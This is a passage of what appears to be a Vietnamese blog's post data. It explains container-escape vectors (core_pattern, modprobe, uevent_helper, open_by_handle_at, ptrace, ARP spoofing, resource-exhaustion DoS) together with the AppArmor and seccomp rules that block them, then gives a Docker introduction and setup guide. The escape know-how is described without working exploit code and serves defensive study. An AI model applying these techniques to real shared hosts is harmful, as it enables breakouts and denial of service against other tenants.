Access Control (MAC), where access rules for a program are described by a profile. AppArmor là LSM phổ biến nhất trong hệ thống container, nó có thể giới hạn các hành động mà một chương trình nhất định có thể thực hiện, cũng như thực hiện các hành động phức tạp khi bắt đầu process. Cả LXC và Docker đều thiết lập ở chế độ mặc định để xây dựng những rào cản an ninh, chống lại những mối đe dọa theo chiều sâu. Cho đến nay, AppArmor được ghi nhận là hỗ trợ và ghi nhận tốt nhất.\nDo sự đơn giản của cú pháp AppArmor, nó cũng dễ sử dụng hơn rất nhiều để cấu hình tùy chỉnh cho mỗi vùng chứa. Docker and LXC enable a default LSM profile in enforcement mode, wh mostly serves to restrict a container\u0026rsquo;s\naccess to sensitive /proc and /sys entries. The profile also denies mount syscall. Tầm quan trọng của Apparmor Mount Options Chính sách của AppArmor chặn việc truy cập để mounting devpts filesystems. Như comment ở dưới, nếu không có chính sách này, container có thể remount /dev/pts và chiếm quyền truy cập vào các thiết bị đầu cuối của máy chủ. 1 2 3 4 # the container may never be allowed to mount devpts. If it does, it # will remount the host\u0026#39;s devpts. We could allow it to do it with # the newinstance option (but, right now, we don\u0026#39;t). deny mount fstype=devpts Các chính sách dùng để chặn container cố gắng remount root filesystem. Chính sách này được thực hiện như một biện pháp phòng thủ theo chiều sâu. 1 2 3 # ignore DENIED message on / remount deny mount options=(ro, remount) -\u0026gt; /, deny mount options=(ro, remount, silent) -\u0026gt; /, Utility Changes Có rất nhiều \u0026ldquo;nơi nguy hiểm\u0026rdquo; trong /proc và /sys cho phép các container thoát ra ngoài (container escapes).\nTất cả những điều này liên quan tới việc thay đổi vị trí của một tiện ích (chẳng hạn như modprobe) mà máy chủ sẽ gọi khi một sự kiện nhất định xảy ra (ví dụ như yêu cầu load yêu cầu của kernel module).\nBằng cách thay đổi điều này để trỏ đến một chương trình bên trong container của chúng ta, attacker sau đó có thể khiến máy chủ chạy một đoạn mã tùy ý bên ngoài container\nLXC sử dụng bộ quy tắc sau để chặn các cuộc tấn công này. Lưu ý, nó không phải là một cấu hình cảu AppArmor, nó là đầu vào cho một đoạn lệnh python nhỏ tạo ra một phần dài (long portion) của các quy tắc AppArmor.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # Run lxc-generate-aa-rules.py on this file after any modification, to generate # the container-rules file which is appended to container-base.in to create the # final abstractions/container-base. block /sys allow /sys/fs/cgroup/** allow /sys/devices/virtual/net/** allow /sys/class/net/** block /proc/sys allow /proc/sys/kernel/shm* allow /proc/sys/kernel/sem* allow /proc/sys/kernel/msg* allow /proc/sys/kernel/hostname allow /proc/sys/kernel/domainname allow /proc/sys/net/** Những vector quan trọng nào đang bị chặn?\nuevent_helper: uevents là những sự kiện được kernel kích hoạt khi một thiết bị thêm vào hoặc xóa đi. Điều đáng chú ý là đường dẫn của \u0026ldquo;uevent_helper\u0026rdquo; có thể được chỉnh sửa bằng cách ghi vào \u0026quot;/sys/kernel/uevent_helper\u0026quot;.\nDo đó, khi một uevent được kích hoạt (cũng có thể được thực hiện từ userland bằng cách ghi vào các tệp như \u0026quot;/sys/class/mem/null/event\u0026quot;), \u0026ldquo;uevent_helper độc hại\u0026rdquo; sẽ được thực thi.\nmodprobe: modprobe là một tiện ích thuộc userland, được kernel gọi khi kernel cần load một kernel module. Vị trí của nó có thể được thay đổi bằng cách sửa đổi \u0026quot;/proc/sys/kernel/modprobe\u0026quot;,\nvà sau đó chúng ta chỉ cần thực hiện một hành động nào đó để kernel tải một kernel module, code chúng ta sẽ được thực thi. (Chẳng hạn như sử dụng crypto-API để tải crypto-module hoặc sử dụng ifconfig để tải networking module cho thiết bị hiện không sử dụng.)\ncore_pattern: core_patterns thường sử dụng để cho kernel biết cách đặt tên và định dạng các core dumps được tạo khi chương trình bị crash.\nTuy nhiên, nó lại có 1 tính năng rất tệ: \u0026ldquo;từ Linux kernel 2.6.19. Linux hỗ trợ cú pháp thay thế cho tệp /proc/sys/kernel/core_patterm. Nếu ký tự đầu tiên của tệp này là kí tự pipe (|),\nthì phần còn lại của dòng này được hiểu là một chương trình sẽ được thực thi. Thay vì được ghi vào đĩa, core dump lúc bây giờ sẽ được xem là một chuẩn input của chương trình trên.\u0026rdquo;.\nSử dụng tính năng trên, core_pattern có thể được chỉ định để gọi chương trình của chúng ta, rồi để kích hoạt nó, ta chỉ cần làm cho chương trình bị crash.\n/proc/sys/vm/panic_on_oom: đây là global flag, xác định kernel có \u0026ldquo;hoảng sợ\u0026rdquo; (panic) khi gặp phải tình trạng hết bộ nhớ hay không (Out Of Memory - OOM). Điều này cho phép chúng ta tiến hành một cuộc tấn công DOS đơn giản.\nDangerous Paths 1 2 3 4 5 # block some other dangerous paths deny @{PROC}/kcore rwklx, deny @{PROC}/kmem rwklx, deny @{PROC}/mem rwklx, deny @{PROC}/sysrq-trigger rwklx, kcore cung cấp kết xuất đầy đủ của bộ nhớ vậy lí hệ thống (full dump of the physical memory) ở dạng core file. Nó không cho phép ghi vào bộ nhớ đã nói.\nQuyền truy vào điều này cho phép container có thể đọc tất cả host memory.\nkmem: \u0026ldquo;/proc/kmem\u0026rdquo; là một giao diện thay thế cho \u0026ldquo;/dev/kmem\u0026rdquo; (quyền truy cập trực tiếp bị chặn bới cgroup device whitelist), là một kí tự đại diện cho kernel virtual memory.\nNó cho phép cả đọc và viết, cho phép trực tieps sửa đổi kernel memory. (Nó đòi hỏi sự khéo léo hơn một chút so với kmem, vì các địa chỉ ảo cần được phân giải thành các địa chỉ vật lí trước).\nsysrq-trigger: ghi vào tệp đặc biệt này cho phép gửi các lệnh khóa yêu cầu (Request Key commands), cho phép môt số hành động đặc quyền,\nchẳng hạn như hủy các quy trình, liệt kê tất cả các quy trình trên hệ thông hoặc kích hoạt khởi động lại máy chủ.\nCác khối quan trọng cuối cùng ghi đến một số nơi khác nhau có thể nguy hiểm:\n1 2 3 4 5 6 # deny writes in /sys except for /sys/fs/cgroup, also allow # fusectl, securityfs and debugfs to be mounted there (read-only) deny mount fstype=debugfs -\u0026gt; /var/lib/ureadahead/debugfs/, deny /sys/firmware/efi/efivars/** rwklx, deny /sys/kernel/security/** rwklx, deny @{PROC}/sys/fs/** wklx, debugfs: cung cấp một giao diện \u0026ldquo;no rules\u0026rdquo; mà kernel (hoặc kernel module) có thể tạo ra các giao diện debug có thể truy cập vào vùng người dùng (userland).\nNó đã có một số vấn đề về bảo mật trong quá khứ và các nguyên tắc \u0026ldquo;no rules\u0026rdquo; đằng sau hệ thống tệp thường xung đột với các ràng buộc bảo mật.\nBên trong một LXC container, nó được gán ở chế độ chỉ đọc.\n/sys/firmware/efi/efivars: efivars cung cấp một giao diện để viết vào NVRAM sử dụng cho các đối số khởi động UEFI (UEFI boot arguments).\nViệc sửa đổi chúng có thể khiến máy chủ không thể khởi động được (unbootable).\n/sys/kernel/security: được gán ở đây là một giao diện securityfs, cho phép cấu hình Linux Security Modules. Nó cho phép cấu hình chính sách của AppArmor,\nvì vậy, quyền truy cập vào điều này có thể cho phép một vùng chứa vô hiệu hóa hệ thống MAC của nó.\n/proc/sys/fs: Thư mục này chứa một mảng các options và thông tin liên quan đến các khía cạnh khác nhau của hệ thống tệp, bao gồm: quota, file handle, inode,\nand dentry information. Ghi vào thư mục này cho phép các cuộc tấn công từ chối dịch vụ khác nhau chống lại máy chủ.\nseccomp Là cơ chế cho system call filtering. Chính sách của policies đến từ 2 version. Trong version 1, một filter là một tập hợp nhỏ các lệnh gọi hệ thống không thể tùy chỉnh. Trong version 2, \u0026ldquo;Filter mode\u0026rdquo;, system call filter được viết như chương trình lọc gói Berkeley (Berkeley Packet Filter - BPF). Điêu\nĐây được gọi là \u0026ldquo;Strict\u0026rdquo; mode. LXC hiện tại sử dụng một chính sách khá đơn giản, trong khi bản release 1.10 của docker được giới thiệu hỗ trợ cho seccomp-bpf.\nMột điều lưu ý là trong Docker 1.10, seccomp không được sử dụng theo mặc định trên trusty (hơi khó hiểu vì docker 1.10 trên ubuntu 15.10, seccomp vẫn được sử dụng mặc định).\nTuy nhiên, kể từ Docker 1.11.1 seccomp hiện cũng được sử dụng theo mặc định trên trusty. Tầm quan trọng của Seccomp Seccomp-BPF cho phép cấu hình lọc những \u0026ldquo;lời gọi hệ thống nguy hiểm\u0026rdquo;. Đối với một số phiên bản hiện nay, LXC đã xuất xưởng với chính sách seccomp rất nhỏ, đơn giản,\nvới minh họa ở dưới. Với bản Docker 1.10, Docker đã thêm nhiều chính sách phức tạp hơn.\n1 2 3 4 5 6 7 8 9 2 blacklist reject_force_umount # comment this to allow umount -f; not recommended [all] kexec_load errno 1 open_by_handle_at errno 1 init_module errno 1 finit_module errno 1 delete_module errno 1 Phần đầu của chính sách LXC được sử dụng như một biện pháp bảo vệ chuyên sâu để ngăn chạn các vùng chứa buộc phải ummounting các phần của filesystem.\nKernel Manipulation Một số lệnh cho phép thao tác với kernel module bị cấm (init_module, finit_module, delete_module), cũng như kexec_load cho phép thay thế kernel hiện tại bằng\nmột kernel images mới. Lưu ý, có một số biện pháp bảo vệ chuyên sâu chống lại việc khai thác chúng trong các container đặc quyền:\ninit_module, finit_module, delete_module: tất cả yêu cầu SYS_MODULE capability - đã bị loại bỏ bởi Docker và LXC trong privileged containers. kexec_load không yêu cầu SYS_MODULE, thay vào đó nó yêu cầu SYS_BOOT - privileged LXC container giữ. Trong hầu hết các trường hợp, điều này không thể khai thác (mà không bypass seccomp),\ntuy nhiên, điều đáng chú ý là Linux 3.17 đã gới hiệu 1 biến thể mới của kexec: kexec_file_load. Lệnh gọi này (tải signed kernels) không nằm trong danh sách đen của privileged LXC container, và chỉ yêu cầu SYS_BOOT. Tuy nhiên, vùng chứa LXC đặc quyền có một số vấn đề khác cho phép thoát khỏi container mà không cần boot vào kernel mới (vì trên thực tế, chúng ta có thể bypass seccomp). The Issue With open_by_handle_at() open_by_handle_at là một lợi gọi hệ thống khá thú vị, ban đầu nó được đưa vào kernel để hỗ trợ userspace file servers để các process dễ dàng chuyển các mã định danh tệp duy nhất (unique file identifiers) cho nhau.\nTuy nhiên, nó lại là một cơn ác mộng của bảo mật. Bất kì process nào có khả năng DAC_READ_SEARCH đều có thể sử dụng open_by_handle_at để có quyền truy cập vào bất cứ tệp nào,\nngay cả các tệp bên ngoại không gian tên gắn kết của chúng. Xử lí được chuyển vào open_by_handle_at nhằm mục đích giúp một số nhận dạng không rõ được truy xuất bằng cách sử dụng name_to_handle_at.\nTuy nhiên, quá trình xử lí này lại chứa thông tin nhạy cảm và có thể bị giả mạo. Lỗi này được chỉ ra trong docker container bởi Sebastian krahmer, điều này đã ảnh hướng đến cả LXC và Docker.\nNó cũng là một vấn đề trong OpenVZ (một hệ thống container khác, nhưng nay đã không còn phổ biến nhiều nữa). Docker đã giải quyết bằng cách bỏ DAC_READ_SEARCH (cũng như chặn nhưng truy cập vào open_by_handle_at bằng seccomp).\nLXC giải quyết bằng cách sử dụng user namespaces, và mặc định chặn những lời gọi hệ thống thông qua seccomp. Chính sách của seccomp đã bị vô hiệu hóa trong cả\nprivileged và unprivileged của LXC containers. Vì vậy, những người dùng thận trọng được khuyên nên cấu hình unprivileged LXC container và bỏ DAC_READ_SEARCH (và có thể cả SYS_PTRACE).\nAbusing Privileged Containers SYS_RAWIO Abuse SYS_RAWIO được cho là dễ lạm dụng vì nó được sử dụng trên toàn bộ kernel và trong một số ngữ cảnh nhạy cảm, điều này dẫn đến việc tìm thấy lỗi container escape trên\nLXC privileged container. Những phiên bản mới của LXC đã bỏ SYS_RAWIO và có thêm những luật AppArmor để chặn truy cập vào \u0026ldquo;/proc/bus\u0026rdquo;. Từ bên trong containter, ta có thể truy cập vào \u0026ldquo;control regions\u0026rdquo; của thiết bị được gắn vào host PCI bus bằng \u0026ldquo;/proc/bus/pci/interface\u0026rdquo;. Để truy cập vào \u0026ldquo;/proc/interface\u0026rdquo; cần phải có quyền SYS_RAWIO.\nThậm chí, đường dẫn \u0026ldquo;/proc\u0026rdquo; bị chặn bởi AppArmor, container với SYS_RAWIO vẫn có thể tiếp tục truy cập vào interface này thông qua \u0026ldquo;iopl/ioperm\u0026rdquo;\n(sau đó sử dụng inb, outb, friends để truy cập vào IO ports). Một điều lưu ý là Docker không bị lỗi này, vì \u0026quot;/proc\u0026quot; thường được gắn cho chế độ chỉ đọc và SYS_RAWIO bị loại bỏ.\nTrong phản hồi về lỗi này, nhóm LXC nhận xét rằng họ coi các vùng privileged container vốn không an toàn, vì có một lỗ hổng đã biết và \u0026ldquo;không thể sửa\u0026rdquo; trong các vùng privileged containers. The ptrace Hole \u0026ldquo;Kiểm tra seccomp sẽ không được chạy lại sau khi tracer được thông báo. (Điêu này có nghĩa là hộp cát dựa trên seccomp KHÔNG cho phép sử dụng ptrace, ngay cả sandboxed processes,\nmaf không thận trọng, ptracer có thể được bị sử dụng để escappe).\u0026rdquo;\nBản thân \u0026ldquo;lỗ hổng bảo mật\u0026rdquo; là một vấn đề đơn giản về Time-of-Check-to-Time-of-Use (TOCTTOU): seccomp filtering được áp dụng trước khi tracer được thông báo (và trước khi cuộc gọi hệ thống thực sự dược kích hoạt),\nvì vậy pacer có thể sửa đổi các thanh ghi được sử dụng trong lệnh gọi hệ thống (sau khi chúng đã được kiểm tra bởi seccomp) để biến một lệnh gọi hệ thống từ bình thường trở thành \u0026ldquo;độc hại\u0026rdquo;.\nCách mafg docker giải quyết vấn đề này đơn giản là không cho phép sử dụng ptrace trong containers (bằng cách loại bỏ SYS_PTRACE ở chế độ mặc định). Mặc dù seccomp có thể bị vô hiệu hóa bằng cách sử dụng ptrace trong unprivileged contaner,\nviệc làm dụng open_by_handle_at sẽ không thành công, vì quá pocess vẫn thiếu DAC_READ_SEARCH trong root namespace. Với việc bổ sung user namespace vào docker, khả năng docker sẽ cho phép sử dụng ptrace bên trong container (mặc dù không chắc\ndo sự tập trung gần đây của họ vào seccomp).\nMặc dù LXC privileged containers vốn đã không an toàn, việc tìm ra các điểm đột phá (breakout) là một bài tập thú vị (và thường chúng có thể làm cho các privileged container an toàn hơn một chút)\nAbusing Unprivileged Containers Tiếp theo, chúng ta sẽ tìm hiểu những điểm yếu của unprivileged containers.\nPID Namespacing Info-Leak Chúng ta sẽ nói đến tệp /proc/sched_debug. pseudo-file này cho phép unprivileged user có thể xem thông tin debug cho Linux scheduler và không biết PID-namespace. Dễ thấy, nó tiết lộ tên và PID của tất cả các tiến trình đang chạy trên hệ thống (và thậm chí biết cả nhóm tác vụ của chúng (cgroup) là gì, giúp xác định được các vùng chứa khác trên hệ thống và hệ thống container nào đang được thực thi). Lỗi này đã được reported cho cả Docker và LXC và nó đã được vá ở Docker.\nNET_RAW abuse Cấu hình phổ biến nhất cho các công ty cung cấp giải pháp PaaS được xây dựng trên container là có nhiều container của khách hàng chạy trên cũng một máy chủ vật lý. Theo mặc định, cả LXC và Docker đều thiết lập container network để tất cả các vùng chứa chia sẻ cùng một Linux virtual bridge. Do đó, những container này sẽ có thể giao tiếp với nhau. Ngay cả khi quyền truy cập mạng trực tiếp này bị vô hiệu hóa (set flag -icc = false cho Docker hoặc sử dụng iptables rules cho LXC), các container vẫn không bị hạn chế đối với việc truy cập link-layer traffic. Đặc biệt, có thể tiến hành một cuộc tấn công giả mạo ARP vào một container khác trong cùng một hệ thống máy chủ, cho phép tấn công full middle-person đối với lưu lượng của container mục tiêu. Chúng ta sẽ có một bài viết nói rõ hơn về cách tần công này.\nSau khi nhận được báo cáo này, LXC team đã đề xuất một số giải pháp, chúng bao gồm:\nSử dụng LXD với OpenStack để quản lí container networking Sử dụng libvirt để quản lí MAC tables của bridges/containers. Sử dụng một virtual bridge riêng trên mỗi trust zone hoặc trên mỗi container. Denial of Service Attacks User namespaces hoạt động bằng cách \u0026ldquo;sliding\u0026rdquo; UIDs giữa user namspace (container) và root namespace (host). Ví dụ, mặc định cài đặt của LXC thì UID 0 bên trong contaner sẽ trở thành UID 100000 trên host. Tuy nhiên, mặc định trên cả LXC và Docker là sử dụng cùng một trang trình bày UID cho tất cả các unprivileged container.\nNói cách khác, các UID giống hệt nhau của các process trong container khác nhau sẽ có giá trị giống nhau trên máy chủ, chỉ được chuyên lên bằng một slide không đổi (tức là tất cả các process đang chạy dưới root bên trong bất kì container nào sẽ đang chạy với UID 100000 trên host). Điều nay làm tăng khả năng ulimit của người dùng khi bị tấn công, vì các khu vực này của kernel không xác định được user namespace. Lưu ý rằng các điều kiện của từ chối dịch vụ (Dos) xảy ra mà không cần user namespace (cũng như điều kiện tương tự của UID máy chủ được chia sẻ đẻ áp dụng). Chúng ta sẽ có một bài viết riêng để thảo luận về cách tấn công này, tuy nhiên chúng ta có một số khái niệm cần lưu ý:\npending Signals: Đây là giới hạn cho mỗi người dùng về số lượng tín hiệu đang chờ xử lý tối đa có thể được xếp hàng đợi trong tất cả các process của người dùng. process chạy trong một container có thể xếp hàng đợi số lượng tin hiệu đang chờ xử lý tối đa, ngăn các quá trình trong các process khác nhận được tín hiệu đang chờ xử lý. Thực nghiệm cho thấy, điều này làm ảnh hưởng đến cả LXC và Docker. Posix Message Queues: giới hạn số lượng tài nuyên tối đa có thể được sử dụng trên hàng đợi thông điệp POSIX. Quá trình chạy trên một container có thể làm cạn kiệt tất cả bộ nhớ hàng đợi thông điệp POSIX có sẵn, ngăn các process trong container khác tạo hoặc gửi thông điệp đến hàng đợi thông điệp POSIX, Thử nghiệm cho thấy việc này vẫn đang hoạt động trên LXC và Docker. Max User Processes: giới hạn cho mỗi người dùng về số lượng process tối đa. Điều này có thể dễ dàng được khai thác để tạo ra một Dos đơn giản chống lại các container khác, cũng như máy chủ. Thử nghiệm cho thấy cuộc tấn công này rất thành công trên LXC (và có thể làm hỏng toàn bộ máy chủ) trong khi trên Docker chỉ có thể hạ tất cả vùng chứa Docker (máy chủ vẫn ổn định). Lưu ý, Linux 4.3 đã thêm khả năng giới hạn tài nguyên PID, điều này giúp các hệ thống container giảm thiếu vấn đề này. Max Files: Đây là giới hạn cho mỗi người dùng về số lượng bộ mô tả tệp tối đa có thể mở. Tren cả LXC và Docker, đây là một cách dễ dàng để Dos tất cả các container khác đang chạy trên cùng 1 máy chủ.\nBỏ qua ulimit, hai điều kiện Dos khác có thể được khai thác trong container như sau: Disk Space: có lẽ, Dos đơn giản nhất để tấn công hệ thống container là làm cho ổ đĩa bị full. Thử nghiệm, cho thấy điều này đã hoạt động trên LXC và Docker. Không giống như một sô cuộc tấn công Dos ở trên, thường có thể làm hỏng máy chú hoạc gây ra bất ổn đủ để chúng khó dọn dẹp, cách này cung cấp khả năng đơn giản nhất để tạo ra một Dos và sau đó dọn dẹp nó một cách nhanh chóng. Kết hợp với PID Namespacing Info-Leak, điều này có thể cho phép container của kẻ tấn công nhằm mục tiêu đến những người thuê khác trên cùng một máy chủ được chia sẻ, chỉ tạo điều kiện Dos có chọn lọc khi một số container hoặc process khác đang chạy. Global File Descriptor Limits: Hệ thống duy trì giới hạn về số lượng bộ mô tả tệp tối đa có sẵn tổn thể (có sẵn tại /proc/sys.fs.filemax, như thảo luận trước đó, container không thể ghi vào). Nếu container không chia sẻ UID và có bộ ulimit về số bộ mô tả tệp mà chúng ta có thể mở, container vẫn có thể cố gắng DoS máy chủ và các contaienr khác bằng cách mở sô lương FD tối đa cho phép khi mỗi người dùng trong user namespace của họ, cung cấp khả năng tiêu thụ FD được khuếch đại rất nhiều. Đây thường là Dos \u0026ldquo;last line\u0026rdquo; và chỉ được được thiện nếu các biên pháp giảm nhẹ cho các vector khác (đơn gian hơn) được đưa ra. Container Engine Vulnerabilities Một số lỗ hổng và cách khai thác.\nDocker Vulnerabilities Weak/proc permissions Host FD leakage Symlinks CVE-2015-3630 CVE-2015-3627 CVE-2015-3627 CVE-2015-3631 CVE-2019-15664 CVE-2015-3629 CVE-2019-15664 Escape via Insecure Configuration Bad idea #1: Exposed Docker Socket Bad idea #2: \u0026ndash;privileged container Bad idea #3: Excessive Capabilities Bad idea #4: Sensitive mounts Kernel Exploitation The security model of containers is predicated on kernel integrity\nDirty CoW (CVE-2016-5195) ","description":"Tìm hiểu về Container Escapes","id":25,"section":"posts","tags":["Docker"],"title":"Tìm hiểu về Container Escapes","uri":"https://minhlongmt183.github.io/posts/container-escapes/"},{"content":"\rToàn bộ series này được tham khảo từ hai nguồn chính: XuanThuLabChanel và DockerDoc. Em xin chân thành cảm ơn sự cống hiến của các tác giả của những kênh nói trên.❤️❤️❤️\rTổng quan về Docker Docker là gì? Docker là một container platform để phát triển, triển khai và quản lí ứng dụng nhanh chóng. Docker là nền tảng mở (open platform) để phát triển (developing), vận chuyển (shipping) hoặc chạy (running) các ứng dụng. Docker cho phép ứng dụng của chúng ta độc lập với cơ sở hạ tầng (infrastructure) của máy, do đó, chúng ta có thể dễ dàng chia sẻ ứng dụng một cách dễ dàng giữa các thiết bị. Chúng ta có thể quản lí cở sở hạ tầng (infrastructure) giống như cách quản lí những ứng dụng trên máy. Sử dụng LibContainer để quản lý những function của Linux kernel và sử dụng những nhóm công nghệ độc lập như: Namespaces, Control Groups, AppArmor, security profiles, network interface, rule for the firewall necessary for the operation of containers. The Docker platform Docker cung cấp một khả năng đóng gói và chạy ứng dụng trên một môi trường cô lập, khả năng này gọi là container. Container nhẹ và chứa tất cả những thức cần thiết để chạy ứng dụng, do đó, chúng ta chỉ cần tải về và chạy trên máy cá nhân (host). Ngoài ra, môi trường được chạy là môi trường độc lập và bảo mật (security) cho phép chúng ta chạy nhiều container đồng thời và dễ dàng chia sẻ container trong khi chúng ta làm việc, và đảm bảo tất cả mọi người đều được chúng ta chia sẻ một container sẽ có chung 1 môi trường thực thi ứng dụng, và cho kết quả thực thi giống nhau. Docker cung cấp công cụ và nền tảng để quản lí vòng đời (lifecycle) containers của chúng ta: Phát triển ứng dụng của chúng ta và hỗ trợ những thành phần để ứng dụng có thể sử dụng container. Container trở thành một đơn vị (unit) để phân phối và kiểm tra ứng dụng của chúng ta. Dùng docker để làm gì? Nhanh, phân phối nhất quán ứng dụng của chúng ta Docker sắp xếp hợp lí vòng đời phát triển bằng cách cho phép các developers làm việc trong môi trường chuẩn, sử dụng local container - nơi cung cấp những ứng dụng và dịch vụ (services). Conatiner là một giải pháp cho quy trình làm việc CI/CD (continuous integration and continuous delivery).\nKhả năng triển khai và mở rộng Nền tảng dựa của container docker đáp ứng cho khối công việc có khả năng linh động cao. Docker container có thể chạy trên laptop của lập trình viên, có thể chạy trên máy thật hoặc máy ảo trong các data center, trên clouder provider, hoặc trong hỗn hợp các môi trường (mixture of environments) Tính linh động và nhẹ của docker làm cho nó dễ dàng trong việc quản lý động các công việc, mở rộng hoặc chia nhỏ các ứng dụng, dịch vụ theo nhu cầu kinh doanh, trong thời gian thực. Chạy được nhiêu công việc hơn trong cùng một phần cứng (hardware). Vì docker nhẹ và nhanh, nó có khả năng thay thế những máy ảo được xây dựng dựa trên hypervisor, chúng ta có thể sử dụng nhiều khả năng tính toán hơn để thực hiện mục tiêu của mình. Docker hoạt động hiệu quả cho cả môi trường triển khai có mật độ cao, vừa hoặc nhỏ, nơi mà chúng ta cần làm việc với ít tài nguyên hơn.\nKiến trúc của Docker. Docker sử dụng kiến trúc client-server. Docker client sẽ nói chuyện với docker daemon - trình thực hiện xây dựng, chạy, phân phối docker container của chúng ta. Docker client và daemon có thể chạy trên cùng 1 hệ thống, hoặc có thể kết nối docker client tới một trình điều khiển docker daemon (remote docker daemon) Chúng giao tiếp với nhau thông qua sử dụng REST API, qua UNIX sockets hoặc network interface. The Docker Daemon( dockerd) Lắng nghe những yêu cầu từ Docker API và quản lí đối tượng của docker như: images, container, networks, volumes. Một daemon can thể giao tiếp với những daemons khác để quản lí docker services.\nThe Docker client (docker) Là cách mà người dùng tương tác với docker. khi chúng ta thực hiện những câu lệnh như docker run, client sẽ gửi câu lệnh này với dockered để đem chúng ra ngoài. Lệnh docker sử dụng Docker API. Docker client có thể giao tiếp với một hoặc nhiều daemon.\nDocker registries Môt docker registry lưu trữ Docker images. Docker Hub là một public registry mà mọi người đều có thể sử dụng, và docker được cấu hình mặc định để tìm kiếm những images trên Docker Hub. chúng ta còn có thể chạy những registry của riêng chúng ta.\nKhi chúng ta thực hiện lệnh docker pull hoặc docker run, những images yêu cầu sẽ được kéo từ registry của chúng ta về máy, và khi thực hiện lệnh docker push, images của chúng ta sẽ được đẩy lên trên registry.\nDocker Object Images Một image là một mẫu chỉ đọc với tập lệnh để tạo ra một docker container. Thông thường, một image dựa trên những image khác với một số tùy chỉnh bổ sung. Ví dụ, chúng ta muốn xây dựng một image dựa trên ubuntu image, nhưng có cài thêm Apache web server, ứng dụng riêng của chúng ta cũng như những cấu hình cần thiết để có ứng dụng chạy.\nchúng ta có thể tạo images riêng hoặc sử dụng những images đã có sẵn trên các registry.\nĐể xây dựng riêng images, chúng ta tạo Dockfile với những cú pháp đơn giản định nghĩa các bước cần thiết để tạo image và chạy nó. Mỗi câu lệnh trong Dockerfile tạo một layer trong image. Khi bạn thay đổi Dockerfile và rebuild image, chỉ những layer bị thay đổi mới buil lại. Đây chính là lí do làm cho image trở nên nhẹ, nhỏ, nhanh khi đem so sánh với những công nghệ ảo hóa khác.\nContainers Docker đóng gói phần mềm thành một đơn vị chuẩn, gọi là container, nơi lưu tất cả những thứ cần thiết để chạy phần mềm, bao gồm: libraries, systemtools, and code Một container có thể chạy một images. Chúng ta có thể create, start, stop, move, delete một container bằng sử dụng Docker API hoặc CLI. Chúng ta có thể kết nối từ một container tới một hoặc nhiều networks, đính kèm bộ nhớ vào trong nó, hoặc thâm chí có thể tạo ra một image mới dựa trên trạng thái hiện tại của nó. Theo mặc định, một container độc lập với những container khác và với host machine. Chúng ta có thể kiểm soát mức độ độc lập của network, bộ nhớ hoặc những hệ thống con cơ bản từ môt container tới những container khác hoặc từ host machine tới những container. Một container được định nghĩa bởi images của nó, cũng như bất kỳ tùy chọn cấu hình nào bạn cung cấp cho nó khi tạo hoặc khởi động nó. Khi một container bị xóa, những thay đổi về trạng thái của nó không được lưu mà sẽ bị xóa. Ví dụ về docker run command Những câu lệnh sau run một ubuntu container:\n1 $ docker run -i -t ubuntu /bin/bash Khi chúng ta chạy lệnh này, quá trình thực hiện sẽ nhưu sau (xét trường hợp cấu hình là default):\n1. Nếu chúng ta không có ubuntu image ở local, Docker pulls nó từ configured registry của chúng ta, chúng ta có thể kéo nó xuống bằng câu lệnh: docker pull ubuntu\n2. Docker tạo ra một container mới, chúng ta có thể tự thực hiện bằng lệnh: docker container create.\n3. Docker phân bổ read-write filesystem vào container, như là lớp cuối cùng của nó (final layer). Nó cho phép chạy để tạo hoặc chỉnh sửa file hoặc thư mục ở local filesystem.\n4. Docker tạo ra network interface để để nối contain tới default network, vì chúng ta không chỉ định bất kì tùy chọn mạng nào - gán IP adress vào container. Theo định nghĩa, container có thể kết nối với mạng bên ngoài thông qua sử dụng kết nối mạng của máy host.\n5. Docker chạy container rồi thực thì /bin/bash. Vì container đang chạy ở chế độ tương tác và gán vào terminal (-i, -t flags), chúng ta có thể input từ keyboard và output được ghi vào terminal của bạn.\n6. Khi chúng ta gõ exit để dừng /bin/bash, container sẽ dừng nhưng không bị xóa, do đó, ta có thể chạy lại hoặc xóa nó.\nThe underlying technology Docker được viết bằng ngôn ngữ GO và tận dụng một số tính năng từ Linux kernel để trở thành chức năng của nó.\nDocker sử dụng một công nghệ được gọi là namespaces để cung cấp không gian độc lập được gọi là container. Khi bạn chạy một container, Docker tạo ra một tập namespaces cho container đó.\nNhững namespaces cung cấp một lớp độc lập, mỗi khía cạnh của một vùng chứa chạy trong một không gian tên riêng biệt và quyền truy cập của nó bị giới hạn trong không gian tên đó.\nCài docker Post-installation steps for Linux Quản lý docker với tư cách là non-root user Docker daemon kết nối với Unix socket thay vì cổng TCP. Mặc định, Unix socket được sở hữu bởi root\nvà những user khác chỉ có thể truy cập thông qua lệnh sudo. Do đó, Docker daemon luôn luôn chạy\nvới tư cách là root user. Chúng ta có thể thiết lập lại để chạy mà không cần lệnh sudo bằng cách tạo ra một Unix group là docker\nvà thêm user vào nó. Khi docker daemon chạy, nó tạo một Unix socket mà tất cả các thành phần của docker group\ncó thể truy cập vào. Tạo docker group: 1 $ sudo groupadd docker Thêm user vào docker group 1 $ sudo usermod -aG docker $USER Kích hoạt sự thay đổi 1 $ newgrp docker Configure Docker to start on boot Trên Debian và Ubuntu, Docker service mặc định được cấu hình để khởi động khí boot.\nVới những distros khác, ta có thể sử dụng lệnh sau đây để tự động chạy: 1 2 $ sudo systemctl enable docker.service $ sudo systemctl enable containerd.service Và để tắt chế độ trên: 1 2 $ sudo systemctl disable docker.service $ sudo systemctl disable containerd.service Cấu hình nơi Docker daemon lắng nghe để kết nối Mặc định, Docker daemon sẽ nghe kết nối ở UNIX socket để chấp nhận các yêu cầu từ local client.\nNgoài ra, chúng ta có thể cho phép Docker chấp nhận những yêu cầu từ remote host bằng việc cấu hình để nó lắng nghe\ntrên một địa chỉ IP và một cổng, giống như UNIX socket. Configuring remote access with systemd unit file sudo systemctl edit docker.service để ghi đè file docker.service. Thêm / sửa những lệnh sau: 1 2 3 [Service] ExecStart= ExecStart=/usr/bin/dockerd -H fd:// -H tcp://127.0.0.1:2375 Lưu file Reload lại cấu hình systemctl 1 $ sudo systemctl daemon-reload Chạy lại Docker 1 $ sudo systemctl restart docker.service Kiểm tra đảm bảo sự thay đổi 1 $ sudo netstat -lntp | grep dockerd Configuring remote access with daemon.json Thêm dòng lệnh vào /etc/docker/daemon.json để kết nối với UNIX socket và địa chỉ IP: 1 2 3 { \u0026#34;hosts\u0026#34;: [\u0026#34;unix:///var/run/docker.sock\u0026#34;, \u0026#34;tcp://127.0.0.1:2375\u0026#34;] } Khởi động lại Docker Kiểm tra đảm bảo sự thay đổi 1 $ 